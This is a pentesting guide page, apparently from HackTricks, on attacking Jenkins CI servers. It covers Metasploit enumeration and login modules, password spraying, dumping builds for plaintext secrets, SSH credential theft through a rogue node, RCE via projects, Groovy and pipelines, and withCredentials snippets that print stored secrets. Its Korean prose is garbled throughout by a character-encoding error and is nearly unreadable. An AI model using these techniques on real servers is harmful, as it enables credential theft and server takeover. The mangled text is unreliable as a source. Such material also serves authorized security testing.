# Jenkins ë³´ì•ˆ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ì´ ë˜ëŠ” AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

JenkinsëŠ” **íŒŒì´í”„ë¼ì¸ì„ ì‚¬ìš©í•˜ì—¬ ê±°ì˜ ëª¨ë“  í”„ë¡œê·¸ë˜ë° ì–¸ì–´ ë° ì†ŒìŠ¤ ì½”ë“œ ì €ì¥ì†Œì˜ ì—°ì†ì  í†µí•©** ë˜ëŠ” **ì—°ì†ì  ì „ë‹¬** (CI/CD) í™˜ê²½ì„ ê°„ë‹¨í•˜ê²Œ ì„¤ì •í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ë˜í•œ ë‹¤ì–‘í•œ ë£¨í‹´ ê°œë°œ ì‘ì—…ì„ ìë™í™”í•©ë‹ˆë‹¤. JenkinsëŠ” **ê°œë³„ ë‹¨ê³„ì— ëŒ€í•œ ìŠ¤í¬ë¦½íŠ¸ ì‘ì„± í•„ìš”ì„±ì„ ì œê±°í•˜ì§€ëŠ” ì•Šì§€ë§Œ**, ë¹Œë“œ, í…ŒìŠ¤íŠ¸ ë° ë°°í¬ ë„êµ¬ì˜ ì „ì²´ ì‹œí€€ìŠ¤ë¥¼ ìˆ˜ë™ìœ¼ë¡œ êµ¬ì„±í•˜ê¸°ë³´ë‹¤ ë¹ ë¥´ê³  ê²¬ê³ í•œ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## ì¸ì¦ë˜ì§€ ì•Šì€ ì—´ê±°

(_/people_ ë˜ëŠ” _/asynchPeople_ê³¼ ê°™ì€ ì¸ì¦ë˜ì§€ ì•Šì€ Jenkins í˜ì´ì§€ë¥¼ ì°¾ê¸° ìœ„í•´ (í˜„ì¬ ì‚¬ìš©ì ëª©ë¡ì„ ë‚˜ì—´í•¨) ì¸ì¦ ì—†ì´ í¥ë¯¸ë¡œìš´ Jenkins í˜ì´ì§€ë¥¼ ê²€ìƒ‰í•˜ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
ì¸ì¦ ì—†ì´ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```
msf> use auxiliary/scanner/http/jenkins_command
```
ìê²© ì¦ëª… ì—†ì´ _**/asynchPeople/**_ ê²½ë¡œë‚˜ _**/securityRealm/user/admin/search/index?q=**_ì—ì„œ **ì‚¬ìš©ì ì´ë¦„**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Jenkins ë²„ì „ì„ _**/oops**_ ë˜ëŠ” _**/error**_ ê²½ë¡œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (146).png>)

### ì•Œë ¤ì§„ ì·¨ì•½ì 

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ë¡œê·¸ì¸

ê¸°ë³¸ ì •ë³´ì—ì„œ **Jenkins ë‚´ë¶€ë¡œ ë¡œê·¸ì¸í•˜ëŠ” ëª¨ë“  ë°©ë²•**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ë“±ë¡

**ê³„ì •ì„ ìƒì„±í•˜ê³  ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ” Jenkins ì¸ìŠ¤í„´ìŠ¤**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëƒ¥ ê·¸ë ‡ê²Œ ê°„ë‹¨í•©ë‹ˆë‹¤.

### **SSO ë¡œê·¸ì¸**

ë˜í•œ **SSO ê¸°ëŠ¥/í”ŒëŸ¬ê·¸ì¸**ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš° í…ŒìŠ¤íŠ¸ ê³„ì •(ì¦‰, í…ŒìŠ¤íŠ¸ **Github/Bitbucket ê³„ì •**)ì„ ì‚¬ìš©í•˜ì—¬ ì‘ìš© í”„ë¡œê·¸ë¨ì— **ë¡œê·¸ì¸**ì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤. [**ì—¬ê¸°**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ì˜ ìš”ë ¹.

### ë¸Œë£¨íŠ¸í¬ìŠ¤

**Jenkins**ëŠ” **ì•”í˜¸ ì •ì±…**ê³¼ **ì‚¬ìš©ì ì´ë¦„ ë¸Œë£¨íŠ¸í¬ìŠ¤ ë°©ì§€**ê°€ ë¶€ì¡±í•©ë‹ˆë‹¤. **ì•½í•œ ì•”í˜¸** ë˜ëŠ” **ì‚¬ìš©ì ì´ë¦„ì„ ì•”í˜¸ë¡œ ì‚¬ìš©í•˜ëŠ” ê²½ìš°**ì™€ ê°™ì´ **ì‚¬ìš©ì ì´ë¦„ì„ ì•”í˜¸ë¡œ ì‚¬ìš©í•˜ëŠ” ê²½ìš°**ê°€ ìˆì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì‚¬ìš©ìë¥¼ **ë¸Œë£¨íŠ¸í¬ìŠ¤**í•´ì•¼ í•©ë‹ˆë‹¤.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### íŒ¨ìŠ¤ì›Œë“œ ìŠ¤í”„ë ˆì´

[ì´ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) ë˜ëŠ” [ì´ íŒŒì›Œì…¸ ìŠ¤í¬ë¦½íŠ¸](https://github.com/chryzsh/JenkinsPasswordSpray)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

### IP í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ìš°íšŒ

ë§ì€ ì¡°ì§ì€ GitHub ë˜ëŠ” GitLabê³¼ ê°™ì€ **SaaS ê¸°ë°˜ ì†ŒìŠ¤ ì œì–´ ê´€ë¦¬ (SCM) ì‹œìŠ¤í…œ**ì„ ë‚´ë¶€ì—ì„œ í˜¸ìŠ¤íŒ…ë˜ëŠ” Jenkins ë˜ëŠ” TeamCityì™€ ê²°í•©í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¤ì •ì€ ì£¼ë¡œ **ì›¹í›… ì´ë²¤íŠ¸ë¥¼ SaaS ì†ŒìŠ¤ ì œì–´ ê³µê¸‰ ì—…ì²´ë¡œë¶€í„° ìˆ˜ì‹ **í•˜ì—¬ íŒŒì´í”„ë¼ì¸ ì‘ì—…ì„ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤.

ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ì¡°ì§ì€ **SCM í”Œë«í¼ì˜ IP ë²”ìœ„ë¥¼ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸**ì— ë“±ë¡í•˜ì—¬ **ì›¹í›…**ì„ í†µí•´ **ë‚´ë¶€ CI ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ëˆ„êµ¬ë‚˜** GitHub ë˜ëŠ” GitLabì— ê³„ì •ì„ ìƒì„±í•˜ê³  **ì›¹í›…ì„ íŠ¸ë¦¬ê±°**í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì ì¬ì ìœ¼ë¡œ **ë‚´ë¶€ CI ì‹œìŠ¤í…œ**ìœ¼ë¡œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í™•ì¸: [shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## ë‚´ë¶€ Jenkins ë‚¨ìš©

ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” Jenkinsì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ìœ íš¨í•œ ê³„ì •ì´ ìˆë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤.

{% hint style="warning" %}
Jenkinsì— êµ¬ì„±ëœ **ì¸ì¦** ë©”ì»¤ë‹ˆì¦˜ ë° ì¹¨í•´ëœ ì‚¬ìš©ìì˜ ê¶Œí•œì— ë”°ë¼ ë‹¤ìŒ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆê³  ì—†ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ìì„¸í•œ ì •ë³´ëŠ” ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ì‚¬ìš©ì ëª©ë¡ ë‚˜ì—´

Jenkinsì— ì•¡ì„¸ìŠ¤í•œ ê²½ìš° [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ì—ì„œ ë“±ë¡ëœ ë‹¤ë¥¸ ì‚¬ìš©ìë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í‰ë¬¸ ë¹„ë°€ ì •ë³´ë¥¼ ì°¾ê¸° ìœ„í•œ ë¹Œë“œ ë¤í”„

[ì´ ìŠ¤í¬ë¦½íŠ¸](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¹Œë“œ ì½˜ì†” ì¶œë ¥ ë° ë¹Œë“œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ë¤í”„í•˜ì—¬ í‰ë¬¸ ë¹„ë°€ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH ìê²© ì¦ëª… ë„ìš©**

ë§Œì•½ ì¹¨í•´ëœ ì‚¬ìš©ìê°€ **ìƒˆë¡œìš´ Jenkins ë…¸ë“œë¥¼ ìƒì„±/ìˆ˜ì •í•  ê¶Œí•œì´ ì¶©ë¶„í•˜ê³ ** ì´ë¯¸ ë‹¤ë¥¸ ë…¸ë“œì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•´ ì €ì¥ëœ SSH ìê²© ì¦ëª…ì´ ìˆë‹¤ë©´, ê·¸ëŠ” ë…¸ë“œë¥¼ ìƒì„±/ìˆ˜ì •í•˜ê³  **í˜¸ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ì—¬ ìê²© ì¦ëª…ì„ ê¸°ë¡**í•˜ê³  í˜¸ìŠ¤íŠ¸ í‚¤ë¥¼ í™•ì¸í•˜ì§€ ì•Šê³  **ê·¸ ìê²© ì¦ëª…ì„ ë„ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (218).png>)

ì¼ë°˜ì ìœ¼ë¡œ Jenkins SSH ìê²© ì¦ëª…ì€ **ì „ì—­ ì œê³µì**(`/credentials/`)ì— ìˆìœ¼ë¯€ë¡œ, ë‹¤ë¥¸ ë¹„ë°€ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ê·¸ê²ƒë“¤ì„ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ì •ë³´ëŠ” [**ë¹„ë°€ ë¤í”„ ì„¹ì…˜**](./#dumping-secrets)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Jenkinsì—ì„œ RCE**

**Jenkins ì„œë²„ì—ì„œ ì…¸ì„ íšë“¤í•˜ë©´** ê³µê²©ìëŠ” ëª¨ë“  **ë¹„ë°€**ê³¼ **í™˜ê²½ ë³€ìˆ˜ë¥¼ ë…¸ì¶œ**ì‹œí‚¤ê³  ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì— ìˆëŠ” ë‹¤ë¥¸ ê¸°ê³„ë“¤ì„ **ì•…ìš©**í•˜ê±°ë‚˜ ì‹¬ì§€ì–´ **í´ë¼ìš°ë“œ ìê²© ì¦ëª…ì„ ìˆ˜ì§‘**í•  ìˆ˜ ìˆëŠ” ê¸°íšŒë¥¼ ì–»ìŠµë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ JenkinsëŠ” **SYSTEMìœ¼ë¡œ ì‹¤í–‰**ë©ë‹ˆë‹¤. ë”°ë¼ì„œ, ì´ë¥¼ ì¹¨í•´í•˜ë©´ ê³µê²©ìì—ê²Œ **SYSTEM ê¶Œí•œ**ì„ ë¶€ì—¬í•©ë‹ˆë‹¤.

### **í”„ë¡œì íŠ¸ ìƒì„±/ìˆ˜ì •ì„ í†µí•œ RCE**

í”„ë¡œì íŠ¸ ìƒì„±/ìˆ˜ì •ì€ Jenkins ì„œë²„ì—ì„œ RCEë¥¼ ì–»ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì„ í†µí•œ RCE**

ìƒˆ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒë³´ë‹¤ **Groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰**í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### íŒŒì´í”„ë¼ì¸ ìƒì„±/ìˆ˜ì •ì„ í†µí•œ RCE

**íŒŒì´í”„ë¼ì¸ì„ ìƒì„±/ìˆ˜ì •**í•¨ìœ¼ë¡œì¨ **RCEë¥¼ ì–»ì„ ìˆ˜ë„** ìˆìŠµë‹ˆë‹¤:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## íŒŒì´í”„ë¼ì¸ ì•…ìš©

íŒŒì´í”„ë¼ì¸ì„ ì•…ìš©í•˜ë ¤ë©´ ì—¬ì „íˆ Jenkinsì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•©ë‹ˆë‹¤.

### ë¹Œë“œ íŒŒì´í”„ë¼ì¸

**íŒŒì´í”„ë¼ì¸**ì€ **í”„ë¡œì íŠ¸ì—ì„œ ë¹Œë“œ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©**ë  ìˆ˜ë„ ìˆìœ¼ë©°, ì´ ê²½ìš° **ì €ì¥ì†Œ ë‚´ë¶€ì— ìˆëŠ” íŒŒì¼**ì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ `/Jenkinsfile`ì´ ì‚¬ìš©ë©ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (127).png>)

ì €ì¥ì†Œ ì™¸ë¶€ì—ë„ **íŒŒì´í”„ë¼ì¸ êµ¬ì„± íŒŒì¼ì„ ì €ì¥**í•  ìˆ˜ ìˆìœ¼ë©°(ì˜ˆ: ë‹¤ë¥¸ ì €ì¥ì†Œì—), ì €ì¥ì†Œ **ì•¡ì„¸ìŠ¤**ì™€ íŒŒì´í”„ë¼ì¸ ì•¡ì„¸ìŠ¤ë¥¼ **ë¶„ë¦¬**í•˜ëŠ” ê²ƒì´ ëª©ì ì…ë‹ˆë‹¤.

ê³µê²©ìê°€ **í•´ë‹¹ íŒŒì¼ì— ì“°ê¸° ì•¡ì„¸ìŠ¤** ê¶Œí•œì´ ìˆë‹¤ë©´, ê·¸ íŒŒì¼ì„ **ìˆ˜ì •**í•˜ê³  Jenkinsì— ì•¡ì„¸ìŠ¤í•˜ì§€ ì•Šê³ ë„ íŒŒì´í”„ë¼ì¸ì„ **íŠ¸ë¦¬ê±°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê³µê²©ìëŠ” **ì¼ë¶€ ë¸Œëœì¹˜ ë³´í˜¸ë¥¼ ìš°íšŒ**í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤(í”Œë«í¼ ë° ì‚¬ìš©ì ê¶Œí•œì— ë”°ë¼ ìš°íšŒë  ìˆ˜ë„ ìˆê³  ê·¸ë ‡ì§€ ì•Šì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤).

ì‚¬ìš©ì ì •ì˜ íŒŒì´í”„ë¼ì¸ì„ ì‹¤í–‰í•˜ëŠ” ê°€ì¥ ì¼ë°˜ì ì¸ íŠ¸ë¦¬ê±°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* ì£¼ ë¸Œëœì¹˜ì— ëŒ€í•œ **í’€ ë¦¬í€˜ìŠ¤íŠ¸**(ë˜ëŠ” ë‹¤ë¥¸ ë¸Œëœì¹˜ì— ëŒ€í•œ ê°€ëŠ¥ì„±)
* ì£¼ ë¸Œëœì¹˜ë¡œì˜ **í‘¸ì‹œ**(ë˜ëŠ” ë‹¤ë¥¸ ë¸Œëœì¹˜ì— ëŒ€í•œ ê°€ëŠ¥ì„±)
* **ì£¼ ë¸Œëœì¹˜ ì—…ë°ì´íŠ¸** ë° ì‹¤í–‰ì´ ì™„ë£Œë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ê¸°

{% hint style="info" %}
**ì™¸ë¶€ ì‚¬ìš©ì**ì¸ ê²½ìš° **ë‹¤ë¥¸ ì‚¬ìš©ì/ì¡°ì§ì˜ ì €ì¥ì†Œì˜ ì£¼ ë¸Œëœì¹˜ì— PRì„ ìƒì„±**í•˜ê³  **íŒŒì´í”„ë¼ì¸ì„ íŠ¸ë¦¬ê±°**í•  ê²ƒì„ ê¸°ëŒ€í•´ì„œëŠ” ì•ˆ ë©ë‹ˆë‹¤... ê·¸ëŸ¬ë‚˜ **ì˜ëª» êµ¬ì„±**ë˜ì–´ ìˆë‹¤ë©´ ì´ë¥¼ **ì•…ìš©í•˜ì—¬ ê¸°ì—…ì„ ì™„ì „íˆ ì¹¨í•´**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### íŒŒì´í”„ë¼ì¸ RCE

ì´ì „ RCE ì„¹ì…˜ì—ì„œ ì´ë¯¸ [**íŒŒì´í”„ë¼ì¸ ìˆ˜ì •ì„ í†µí•´ RCEë¥¼ ì–»ëŠ” ê¸°ìˆ **](./#rce-creating-modifying-pipeline)ì´ ì´ë¯¸ ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤.

### Env ë³€ìˆ˜ í™•ì¸

ì „ì²´ íŒŒì´í”„ë¼ì¸ì´ë‚˜ íŠ¹ì • ë‹¨ê³„ì— ëŒ€í•´ **í‰ë¬¸ env ë³€ìˆ˜ë¥¼ ì„ ì–¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ env ë³€ìˆ˜ì—ëŠ” ë¯¼ê°í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ì„œëŠ” ì•ˆ ë˜ì§€ë§Œ, ê³µê²©ìëŠ” í•­ìƒ **ëª¨ë“  íŒŒì´í”„ë¼ì¸** êµ¬ì„±/Jenkinsfileì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### ì‹œí¬ë¦¿ ë¤í”„

Jenkinsì—ì„œ ì‹œí¬ë¦¿ì´ ì¼ë°˜ì ìœ¼ë¡œ ì²˜ë¦¬ë˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì •ë³´ëŠ” ë‹¤ìŒì˜ ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

ìê²© ì¦ëª…ì€ **ê¸€ë¡œë²Œ ì œê³µì**(`/credentials/`) ë˜ëŠ” **íŠ¹ì • í”„ë¡œì íŠ¸**(`/job/<project-name>/configure`)ë¡œ **ë²”ìœ„ê°€ ì§€ì •**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ëª¨ë“  ì‹œí¬ë¦¿ì„ ìœ ì¶œí•˜ë ¤ë©´ ì‹œí¬ë¦¿ì„ í¬í•¨í•˜ëŠ” **ëª¨ë“  í”„ë¡œì íŠ¸ë¥¼ ì ì–´ë„ ëª¨ë‘ ì†ìƒ**ì‹œì¼œ ì‚¬ìš©ì ì •ì˜/ì˜¤ì—¼ëœ íŒŒì´í”„ë¼ì¸ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ë¬¸ì œëŠ” íŒŒì´í”„ë¼ì¸ì˜ **í™˜ê²½ ë‚´ì˜ ì‹œí¬ë¦¿ì„ ì–»ìœ¼ë ¤ë©´ ì‹œí¬ë¦¿ì˜ ì´ë¦„ê³¼ ìœ í˜•ì„ ì•Œì•„ì•¼** í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, **`usernamePassword`** ì‹œí¬ë¦¿ì„ **`string`** ì‹œí¬ë¦¿ìœ¼ë¡œ **ë¡œë“œ**í•˜ë ¤ê³  í•˜ë©´ ë‹¤ìŒ **ì˜¤ë¥˜**ê°€ ë°œìƒí•©ë‹ˆë‹¤:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ë‹¤ìŒì€ ì¼ë°˜ì ì¸ ë¹„ë°€ ìœ í˜•ì„ë¡œë“œí•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
ì´ í˜ì´ì§€ì˜ ëì—ì„œ **ëª¨ë“  ìê²© ì¦ëª… ìœ í˜•ì„ ì°¾ì„** ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
í•œêº¼ë²ˆì— **ëª¨ë“  ë¹„ë°€ì„ ë¤í”„í•˜ëŠ” ê°€ì¥ ì¢‹ì€ ë°©ë²•**ì€ **Jenkins** ë¨¸ì‹ ì„ **ì¹¨í•´**í•˜ì—¬(ì˜ˆ: **ë‚´ì¥ ë…¸ë“œì— ì—­ì‰˜ ì‹¤í–‰**) **ë§ˆìŠ¤í„° í‚¤**ì™€ **ì•”í˜¸í™”ëœ ë¹„ë°€**ì„ **ìœ ì¶œ**í•˜ê³  ì˜¤í”„ë¼ì¸ì—ì„œ ë³µí˜¸í™”í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ì´ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [Nodes & Agents ì„¹ì…˜](./#nodes-and-agents) ë° [Post Exploitation ì„¹ì…˜](./#post-exploitation)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### íŠ¸ë¦¬ê±°

[ë¬¸ì„œ](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)ì—ì„œ: `triggers` ì§€ì‹œë¬¸ì€ **íŒŒì´í”„ë¼ì¸ì´ ë‹¤ì‹œ íŠ¸ë¦¬ê±°ë˜ëŠ” ìë™í™”ëœ ë°©ì‹**ì„ ì •ì˜í•©ë‹ˆë‹¤. GitHub ë˜ëŠ” BitBucketê³¼ ê°™ì€ ì†ŒìŠ¤ì™€ í†µí•©ëœ íŒŒì´í”„ë¼ì¸ì˜ ê²½ìš° `triggers`ê°€ í•„ìš”í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìœ¼ë©° ì›¹í›… ê¸°ë°˜ í†µí•©ì´ ì´ë¯¸ ì¡´ì¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í˜„ì¬ ì‚¬ìš© ê°€ëŠ¥í•œ íŠ¸ë¦¬ê±°ëŠ” `cron`, `pollSCM`, `upstream`ì…ë‹ˆë‹¤.

Cron ì˜ˆì‹œ:
```bash
triggers { cron('H */4 * * 1-5') }
```
**ë¬¸ì„œì˜ ë‹¤ë¥¸ ì˜ˆì‹œë¥¼ í™•ì¸í•˜ì„¸ìš”**.

### ë…¸ë“œ & ì—ì´ì „íŠ¸

**Jenkins ì¸ìŠ¤í„´ìŠ¤**ì—ëŠ” **ë‹¤ë¥¸ ë¨¸ì‹ ì—ì„œ ì‹¤í–‰ë˜ëŠ” ë‹¤ë¥¸ ì—ì´ì „íŠ¸**ê°€ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìì˜ ê´€ì ì—ì„œ, ë‹¤ë¥¸ ë¨¸ì‹ ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²ƒì€ **ë„ë‚œí•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ì ì¬ì ì¸ í´ë¼ìš°ë“œ ìê²© ì¦ëª…**ì´ë‚˜ **ë‹¤ë¥¸ ë„¤íŠ¸ì›Œí¬ ì•¡ì„¸ìŠ¤**ë¥¼ ì˜ë¯¸í•˜ë©°, ì´ë¥¼ í†µí•´ ë‹¤ë¥¸ ë¨¸ì‹ ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì˜ ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

